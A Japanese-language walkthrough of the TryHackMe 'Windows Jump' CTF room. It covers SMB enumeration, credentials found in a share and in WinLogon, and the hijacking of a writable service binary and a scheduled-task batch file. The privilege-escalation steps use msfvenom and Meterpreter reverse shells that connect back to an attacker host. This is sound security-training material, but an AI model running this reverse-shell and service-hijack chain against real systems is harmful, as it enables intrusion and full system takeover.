# Windows Jump CTF

https://tryhackme.com/room/windowsjump

## Enumeration

```shell
TARGET=10.144.151.14
sudo bash -c "echo $TARGET   jump.thm >> /etc/hosts"
```

### ポートスキャン

```sh
nmap -v -p- -Pn --min-rate 10000 $TARGET

PORT      STATE    SERVICE
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
445/tcp   open     microsoft-ds
533/tcp   filtered netwall
3389/tcp  open     ms-wbt-server
5985/tcp  open     wsman
7324/tcp  filtered swx
7680/tcp  open     pando-pub
9095/tcp  filtered unknown
11662/tcp filtered unknown
14303/tcp filtered unknown
16901/tcp filtered unknown
28652/tcp filtered unknown
29786/tcp filtered unknown
29917/tcp filtered unknown
31069/tcp filtered unknown
36806/tcp filtered unknown
38448/tcp filtered unknown
41567/tcp filtered unknown
47001/tcp open     winrm
49664/tcp open     unknown
49665/tcp open     unknown
49666/tcp open     unknown
49667/tcp open     unknown
49668/tcp open     unknown
49671/tcp open     unknown
49672/tcp open     unknown
49673/tcp open     unknown
51005/tcp filtered unknown
55076/tcp filtered unknown
56044/tcp filtered unknown
59716/tcp filtered unknown
```

```sh
nmap -v -sV -p135,139,445,3389,5985,7680,47001 -Pn --min-rate 10000 $TARGET

PORT      STATE  SERVICE       VERSION
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open   microsoft-ds?
3389/tcp  open   ms-wbt-server Microsoft Terminal Services
5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
7680/tcp  closed pando-pub
47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP
```

### SMB, NFS, LDAP etc

SMBで welcome.txt をダウンロード。

```sh
$ smbclient -L //$TARGET -U ""
Password for [WORKGROUP\]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Public          Disk      Public file share
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.144.151.14 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

$ smbclient //$TARGET/Public -U ""
Password for [WORKGROUP\]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon May 11 02:40:51 2026
  ..                                  D        0  Mon May 11 02:40:51 2026
  welcome.txt                         A      177  Mon May 11 02:40:50 2026

                7863807 blocks of size 4096. 3587868 blocks available
smb: \> get welcome.txt
```

```sh
$ cat ./welcome.txt 
Welcome to CORP-NET.

New employee default credentials
================================
Username : thmuser
Password : [REDACTED]

Please change your password after first login.
```

この認証情報でRDP接続できた。

## thmuser

flag1からflag3は各ユーザーのデスクトップ。flag4はCドライブ直下にあった。

```sh
C:\Users>tree /A /F
Folder PATH listing
Volume serial number is A8A4-C362
C:.
+---Administrator
+---notadmin
|   \---Desktop
|           flag2.txt
|
+---notadmin.PRIVESC
+---Public
|   +---Documents
|   +---Downloads
|   +---Music
|   +---Pictures
|   \---Videos
+---svcadmin
|   \---Desktop
|           flag3.txt
|
+---svcadmin.PRIVESC
+---thmuser
|   \---Desktop
|           flag1.txt
|
\---thmuser.PRIVESC
    +---3D Objects
    +---Contacts
    +---Desktop
    |       EC2 Feedback.website
    |       EC2 Microsoft Windows Guide.website
    |
    +---Documents
    +---Downloads
    +---Favorites
    |   |   Bing.url
    |   |
    |   \---Links
    +---Links
    |       Desktop.lnk
    |       Downloads.lnk
    |
    +---Music
    +---Pictures
    +---Saved Games
    +---Searches
    \---Videos
```

グループと権限は特になし。

```sh
C:\Users\thmuser\Desktop>whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users           Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON  Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
```

```sh
C:\Users\thmuser\Desktop>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

AutoRun レジストリ。名前だけで判断すると公式のアプリと思われる。

```sh
C:\Users\thmuser\Desktop>reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    SecurityHealth    REG_EXPAND_SZ    %windir%\system32\SecurityHealthSystray.exe
```

PrivescCheck を実行。Highが1件とMediumが2件検出。

```sh
PS C:\Users\Public> Set-ExecutionPolicy Bypass -Scope process -Force
PS C:\Users\Public> . .\PrivescCheck.ps1
PS C:\Users\Public> Invoke-PrivescCheck >out.txt
WARNING: Service: vwifibus | Path not found: C:\Windows\System32\drivers\vwifibus.sys
WARNING: NtOpenSymbolicLinkObject('\Device\BootDevice') - Access is denied (5)
WARNING: Check 'Credentials - Vault (creds)' is categorized as risky, but the option '-Risky' was not specified,
ignoring...
WARNING: Check 'Credentials - Vault (list)' is categorized as risky, but the option '-Risky' was not specified,
ignoring...
WARNING: TpmGetDeviceInformation KO 0x8028400F
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃                 ~~~ PrivescCheck Summary ~~~                 ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
 TA0004 - Privilege Escalation
 - Services - Image File Permissions → High
 - Updates - Update History → Medium
 TA0006 - Credential Access
 - Credentials - WinLogon → Medium
 - Hardening - Credential Guard → Low
 - Hardening - LSA Protection → Low

WARNING: To get more info, run this script with the option '-Extended'.
```

Highは svc.exe にフル権限がついている。

```sh
┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
┃ NAME     ┃ Services - Image File Permissions                 ┃
┃ TYPE     ┃ Base                                              ┃
┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ Check whether the current user has any write permissions on  ┃
┃ a service's binary or its folder.                            ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛


Name              : THMSvc
DisplayName       : THM Background Service
User              : .\svcadmin
ImagePath         : C:\Windows\THMSVC\svc.exe
StartMode         : Manual
Type              : Win32OwnProcess
RegistryKey       : HKLM\SYSTEM\CurrentControlSet\Services
RegistryPath      : HKLM\SYSTEM\CurrentControlSet\Services\THMSvc
Status            : Stopped
UserCanStart      : True
UserCanStop       : True
ModifiablePath    : C:\Windows\THMSVC\svc.exe
IdentityReference : Everyone (S-1-1-0)
Permissions       : AllAccess



[*] Status: Vulnerable - Severity: High - Execution time: 00:00:15.919
```

Medium で notadmin ユーザーのパスワードを発見。

```sh
┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ CATEGORY ┃ TA0006 - Credential Access                        ┃
┃ NAME     ┃ Credentials - WinLogon                            ┃
┃ TYPE     ┃ Base                                              ┃
┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ Check whether the 'WinLogon' registry key contains           ┃
┃ clear-text credentials. Note that entries with an empty      ┃
┃ password field are filtered out.                             ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛


Domain   : 
Username : notadmin
Password : [REDACTED]



[*] Status: Vulnerable - Severity: Medium - Execution time: 00:00:00.036
```

もう一件は、しばらくセキュリティアップデートを実行していないということ。

```sh
┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
┃ NAME     ┃ Updates - Update History                          ┃
┃ TYPE     ┃ Base                                              ┃
┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ Check whether a Windows security update was installed within ┃
┃ the last 31 days.                                            ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

HotFixID  Description     InstalledBy         InstalledOn           
--------  -----------     -----------         -----------           
KB5001568 Update          NT AUTHORITY\SYSTEM 3/17/2021 12:00:00 AM 
KB5000859 Security Update NT AUTHORITY\SYSTEM 3/11/2021 12:00:00 AM 
KB4601555 Update          NT AUTHORITY\SYSTEM 3/11/2021 12:00:00 AM 
KB4589208 Update          NT AUTHORITY\SYSTEM 3/11/2021 12:00:00 AM 
KB4577586 Update          NT AUTHORITY\SYSTEM 3/11/2021 12:00:00 AM 
KB4486153 Update          NT AUTHORITY\SYSTEM 3/11/2021 12:00:00 AM 
KB4601393 Security Update NT AUTHORITY\SYSTEM 2/10/2021 12:00:00 AM 
KB4598480 Security Update NT AUTHORITY\SYSTEM 1/13/2021 12:00:00 AM 
KB4535680 Security Update NT AUTHORITY\SYSTEM 1/13/2021 12:00:00 AM 
KB4587735 Security Update NT AUTHORITY\SYSTEM 11/11/2020 12:00:00 AM
KB4577667 Security Update NT AUTHORITY\SYSTEM 10/14/2020 12:00:00 AM
KB4570332 Security Update NT AUTHORITY\SYSTEM 9/9/2020 12:00:00 AM  
KB4566424 Security Update NT AUTHORITY\SYSTEM 8/12/2020 12:00:00 AM 
KB4558997 Security Update NT AUTHORITY\SYSTEM 7/15/2020 12:00:00 AM 
KB4562562 Security Update NT AUTHORITY\SYSTEM 6/10/2020 12:00:00 AM 
KB4549947 Security Update NT AUTHORITY\SYSTEM 4/15/2020 12:00:00 AM 
KB4539571 Security Update NT AUTHORITY\SYSTEM 3/18/2020 12:00:00 AM 
KB4523204 Security Update NT AUTHORITY\SYSTEM 11/13/2019 12:00:00 AM
KB4521862 Security Update NT AUTHORITY\SYSTEM 10/9/2019 12:00:00 AM 
KB4512577 Security Update NT AUTHORITY\SYSTEM 9/11/2019 12:00:00 AM 
KB4512937 Security Update NT AUTHORITY\SYSTEM 9/6/2019 12:00:00 AM  
KB4504369 Security Update NT AUTHORITY\SYSTEM 6/12/2019 12:00:00 AM 
KB4499728 Security Update NT AUTHORITY\SYSTEM 5/15/2019 12:00:00 AM 
KB4493510 Security Update NT AUTHORITY\SYSTEM 4/21/2019 12:00:00 AM 
KB4480056 Update          NT AUTHORITY\SYSTEM 1/9/2019 12:00:00 AM  
KB4470788 Security Update NT AUTHORITY\SYSTEM 12/12/2018 12:00:00 AM
KB4470502 Update          NT AUTHORITY\SYSTEM 12/12/2018 12:00:00 AM


[*] Status: Vulnerable - Severity: Medium - Execution time: 00:00:10.015
```

## notadmin

RDP と SMB で認証成功しているが、RDP接続は実際にはできなかった。

```sh
$ nxc winrm $TARGET -u 'notadmin' -p '[REDACTED]'         
WINRM       10.144.151.14   5985   PRIVESC          [*] Windows 10 / Server 2019 Build 17763 (name:PRIVESC) (domain:privesc)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.144.151.14   5985   PRIVESC          [-] privesc\notadmin:[REDACTED]
                                                                                                                   
$ nxc rdp $TARGET -u 'notadmin' -p '[REDACTED]'         
RDP         10.144.151.14   3389   PRIVESC          [*] Windows 10 or Windows Server 2016 Build 17763 (name:PRIVESC) (domain:privesc) (nla:True)
RDP         10.144.151.14   3389   PRIVESC          [+] privesc\notadmin:[REDACTED] 
                                                                                                                   
$ nxc smb $TARGET -u 'notadmin' -p '[REDACTED]'         
SMB         10.144.151.14   445    PRIVESC          [*] Windows 10 / Server 2019 Build 17763 x64 (name:PRIVESC) (domain:privesc) (signing:False) (SMBv1:False)
SMB         10.144.151.14   445    PRIVESC          [+] privesc\notadmin:[REDACTED]
```

psexec.py でも接続不可。（管理者権限がなければならない）

```sh
$ psexec.py notadmin@$TARGET
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Requesting shares on 10.144.151.14.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'Public' is not writable.
```

RDP上で runas でログインできた。

```sh
runas /user:notadmin cmd.exe
```

サービス用exeを作成

```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.131.34 LPORT=7777 -f exe-service > svc.exe
```

上書き。

```sh
C:\Windows\system32>copy \\tsclient\_home_kali_ctf_windowsjump_share\svc.exe C:\Windows\THMSVC\svc.exe
Overwrite C:\Windows\THMSVC\svc.exe? (Yes/No/All): Yes
        1 file(s) copied.
```

サービス開始

```sh
C:\Windows\system32>sc.exe start THMSvc

SERVICE_NAME: THMSvc
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 4876
        FLAGS              :
```

meterpreter 取得成功

```sh
$ msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.131.34; set LPORT 7777;exploit"
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/meterpreter/reverse_tcp
LHOST => 192.168.131.34
LPORT => 7777
[*] Started reverse TCP handler on 192.168.131.34:7777 
[*] Sending stage (199238 bytes) to 10.144.151.14
[*] Meterpreter session 1 opened (192.168.131.34:7777 -> 10.144.151.14:50960) at 2026-07-10 02:17:06 -0400

meterpreter > 
```

## svcadmin

サービスユーザーだが、Impersonate はついていなかった。  
SeCreateGlobalPrivilege は昇格につながるものではないと思われる。

```sh
C:\Users\svcadmin\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeCreateGlobalPrivilege       Create global objects          Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

グループも特に無い。

```sh
C:\Windows\system32>whoami /groups
whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes                                        
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                   Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
```

もう一度 Privesc を実行したが新たな項目は出なかった。

```sh
????????????????????????????????????????????????????????????????
?                 ~~~ PrivescCheck Summary ~~~                 ?
????????????????????????????????????????????????????????????????
 TA0004 - Privilege Escalation
 - Services - Image File Permissions ▒ High
 - Updates - Update History ▒ Medium
 TA0006 - Credential Access
 - Hardening - Credential Guard ▒ Low
 - Hardening - LSA Protection ▒ Low
```

サジェスターを実行。いくつか試したがうまくいかなかった。

```sh
meterpreter > run post/multi/recon/local_exploit_suggester
...
 #   Name                                                              Potentially Vulnerable?  Check Result
 -   ----                                                              -----------------------  ------------
 1   exploit/windows/local/bypassuac_comhijack                         Yes                      The target appears to be vulnerable. Windows Server 2019 appears vulnerable                                                           
 2   exploit/windows/local/bypassuac_sluihijack                        Yes                      The target appears to be vulnerable. Version Windows Server 2019 appears vulnerable                                                   
 3   exploit/windows/local/cve_2020_1048_printerdemon                  Yes                      The target appears to be vulnerable. Version Windows Server 2019 appears vulnerable                                                   
 4   exploit/windows/local/cve_2020_1337_printerdemon                  Yes                      The target appears to be vulnerable. Version Windows Server 2019 appears vulnerable                                                   
 5   exploit/windows/local/ms16_032_secondary_logon_handle_privesc     Yes                      The service is running, but could not be validated. Windows session with multiple CPU cores detected                                  
 6   exploit/windows/persistence/bits                                  Yes                      The target is vulnerable. Likely exploitable                                                                                          
 7   exploit/windows/persistence/powershell_profile                    Yes                      The target appears to be vulnerable. Powershell execution policy for CurrentUser (Undefined), will attempt to override                
 8   exploit/windows/persistence/service_for_user/lock_unlock          Yes                      The target appears to be vulnerable. Target is likely exploitable                                                                     
 9   exploit/windows/persistence/service_for_user/logon                Yes                      The target appears to be vulnerable. Target is likely exploitable                                                                     
 10  exploit/windows/persistence/service_for_user/schedule             Yes                      The target appears to be vulnerable. Target is likely exploitable                                                                     
 11  exploit/windows/persistence/startup_folder                        Yes                      The target appears to be vulnerable. Likely exploitable, able to write test file to C:\Users\svcadmin.PRIVESC\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

ここは分からずウォークスルーを見た。Tasksフォルダの中のファイルに書き込み権限がある。

```sh
C:\Windows\Tasks>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Windows\Tasks

05/11/2026  06:42 AM    <DIR>          .
05/11/2026  06:42 AM    <DIR>          ..
05/11/2026  06:41 AM                41 cleanup.bat
               1 File(s)             41 bytes
               2 Dir(s)  14,683,283,456 bytes free

C:\Windows\Tasks>type cleanup.bat
type cleanup.bat
@echo off
del /Q /F "%TEMP%\*.tmp" 2>nul

C:\Windows\Tasks>icacls cleanup.bat
icacls cleanup.bat
cleanup.bat BUILTIN\Users:(I)(RX)
            PRIVESC\svcadmin:(I)(M)
            BUILTIN\Administrators:(I)(F)
            NT AUTHORITY\SYSTEM:(I)(F)

Successfully processed 1 files; Failed processing 0 files
```

cleanup.bat を書き換える。

```sh
$ cat cleanup.bat                            
@echo off
c:\Users\Public\rev.exe
```

ファイル上書き

```sh
C:\Windows\system32>copy C:\Users\Public\cleanup.bat C:\Windows\Tasks\cleanup.bat
copy C:\Users\Public\cleanup.bat C:\Windows\Tasks\cleanup.bat
Overwrite C:\Windows\Tasks\cleanup.bat? (Yes/No/All): Yes
Yes
        1 file(s) copied.
```

取得成功。

```sh
$ msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.131.34; set LPORT 7778;exploit"
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/meterpreter/reverse_tcp
LHOST => 192.168.131.34
LPORT => 7778
[*] Started reverse TCP handler on 192.168.131.34:7778 
[*] Sending stage (199238 bytes) to 10.145.164.171
[*] Meterpreter session 1 opened (192.168.131.34:7778 -> 10.145.164.171:49835) at 2026-07-10 03:21:20 -0400

meterpreter > 
```

```sh
C:\Windows\system32>whoami
whoami
nt authority\system
```

## 振り返り

- パスワードが判明した後どう接続するかいつも迷うが、runas でコマンドプロンプトを取れることを今更ながら学んだ。
- 今回、cleanup.bat のスケジュールタスクを自力で見つけることができなかった。svcadmin ユーザーとして schtasks を実行しても表示されなかったので、ファイルは上書きできるがタスクを表示する権限がなかったという状態だった。つまり、スケジュール一覧からではなく、バッチファイルから探す必要があった。

```sh
icacls C:\Windows\Tasks\*
icacls C:\Windows\System32\Tasks\*

dir /s /b C:\*.bat
```

## Tags

#tags:Windows #tags:サービス #tags:スケジュールタスク
